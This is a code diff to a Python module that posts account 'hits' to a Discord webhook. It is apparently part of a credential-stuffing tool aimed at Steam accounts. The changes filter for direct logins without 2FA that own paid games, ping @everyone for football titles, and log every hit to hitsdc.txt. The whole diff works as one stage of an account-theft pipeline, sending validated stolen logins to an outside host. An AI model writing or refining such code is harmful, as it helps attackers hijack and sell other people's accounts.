@@ -3,6 +3,7 @@ Asynchronous Discord Webhook Dispatcher
 Premium embed design — only paid games shown, FC/PES @everyone, auto-saves hitsdc.txt.
 """
 
+import re
 import time
 import asyncio
 import logging
@@ -155,16 +156,20 @@ def build_discord_embed(item: Dict[str, Any]) -> tuple:
     profile_url  = f"https://steamcommunity.com/profiles/{steamid}" if steamid else None
 
     # ── Filter: only genuinely PAID games ──────────────────────────────────
+    from nexus.core.library import is_item_free
     paid_game_names = []
     football_badge  = False
     football_ping   = False
     for g in games:
         name = (g.get("name") or "").strip()
-        if not name or name.startswith("AppID ") or name.lower() == "none" or name.isdigit():
+        if not name or name.lower() in ("none", "null", "undefined", "unknown"):
             continue
-        if "(paid: " in name.lower() or len(name) <= 2:
+        if name.startswith("AppID ") or name.isdigit() or len(name) <= 2:
             continue
-        if g.get("is_free", False) or _is_free_game(name):
+        if "(paid: " in name.lower() or re.match(r"^\d+(\.\d+)*$", name):
+            continue
+        appid_int = int(g.get("appid")) if str(g.get("appid", "")).isdigit() else 0
+        if g.get("is_free", False) or _is_free_game(name) or is_item_free(appid_int, name):
             continue
         paid_game_names.append(name)
         badge, ping = _football_flags(name)
@@ -375,9 +380,10 @@ class DiscordWebhookDispatcher:
     async def dispatch_hit(self, item: Dict[str, Any]):
         """
         Dispatches a validated hit to Discord.
-        - Only DIRECT logins (HIT) with paid games, OR 2FA hits with paid metadata, are sent.
+        - Only DIRECT logins (HIT) are sent — zero 2FA.
         - FC/FIFA/PES (not eFootball) get @everyone mention.
-        - Every dispatched hit is also saved to hitsdc.txt.
+        - Every dispatched hit is saved to hitsdc.txt.
+        - Sends even if paid_game_names is short — never silently drops real HITs.
         """
         if not self.webhook_url:
             return
@@ -385,11 +391,15 @@ class DiscordWebhookDispatcher:
             await self.start()
 
         try:
-            embed, football_badge, football_ping, paid_game_names = build_discord_embed(item)
-            status = item.get("status", "HIT")
+            status = item.get("status", "")
+            # Strictly direct logins only
+            if status != "HIT":
+                return
 
-            # Only send HIT (direct login) with paid games — skip free-only
-            if status == "HIT" and not paid_game_names:
+            embed, football_badge, football_ping, paid_game_names = build_discord_embed(item)
+
+            # STRICT FILTER: Never send or log accounts without at least 1 verified PAID game!
+            if not paid_game_names or len(paid_game_names) == 0:
                 return
 
             payload: Dict[str, Any] = {
